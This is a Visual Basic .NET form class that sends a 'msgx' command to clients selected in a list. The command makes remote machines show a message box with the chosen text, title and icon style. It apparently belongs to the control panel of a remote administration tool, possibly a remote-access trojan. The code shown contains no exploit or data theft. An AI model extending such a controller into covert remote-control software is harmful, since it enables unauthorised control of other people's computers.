Public Class Form22
    Public xxx As Integer
    Private Sub Button6_Click(sender As Object, e As EventArgs) Handles Button6.Click
        'MsgBox(TextBox1.Text & TextBox2.Text, MsgBoxStyle.Information)

        If Button1.Enabled = False Then
            MsgBox(TextBox1.Text, MsgBoxStyle.Critical, TextBox2.Text)
        End If
        If Button2.Enabled = False Then
            MsgBox(TextBox1.Text, MsgBoxStyle.Exclamation, TextBox2.Text)
        End If
        If Button3.Enabled = False Then
            MsgBox(TextBox1.Text, MsgBoxStyle.Information, TextBox2.Text)
        End If
        If Button4.Enabled = False Then
            MsgBox(TextBox1.Text, 0, TextBox2.Text)
        End If
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Button1.Enabled = False
        Button4.Enabled = True
        Button3.Enabled = True
        Button2.Enabled = True
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Button1.Enabled = True
        Button4.Enabled = True
        Button3.Enabled = True
        Button2.Enabled = False
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        Button1.Enabled = True
        Button4.Enabled = True
        Button3.Enabled = False
        Button2.Enabled = True
    End Sub

    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
        Button1.Enabled = True
        Button4.Enabled = False
        Button3.Enabled = True
        Button2.Enabled = True
    End Sub

    Private Sub Button5_Click(sender As Object, e As EventArgs) Handles Button5.Click

        If Button1.Enabled = False Then


            For Each x As ListViewItem In Form1.L1.SelectedItems
                Form1.S.Send(x.ToolTipText, "msgx" & "|U|" & TextBox1.Text & "|U|" & TextBox2.Text & "|U|" & "0")
            Next





        End If
        If Button2.Enabled = False Then


            For Each x As ListViewItem In Form1.L1.SelectedItems
                Form1.S.Send(x.ToolTipText, "msgx" & "|U|" & TextBox1.Text & "|U|" & TextBox2.Text & "|U|" & "1")
            Next








        End If
        If Button3.Enabled = False Then


            For Each x As ListViewItem In Form1.L1.SelectedItems
                Form1.S.Send(x.ToolTipText, "msgx" & "|U|" & TextBox1.Text & "|U|" & TextBox2.Text & "|U|" & "2")
            Next








        End If
        If Button4.Enabled = False Then


            For Each x As ListViewItem In Form1.L1.SelectedItems
                Form1.S.Send(x.ToolTipText, "msgx" & "|U|" & TextBox1.Text & "|U|" & TextBox2.Text & "|U|" & "3")
            Next








        End If
    End Sub

    Private Sub Form22_Load(sender As Object, e As EventArgs) Handles MyBase.Load

    End Sub
End Class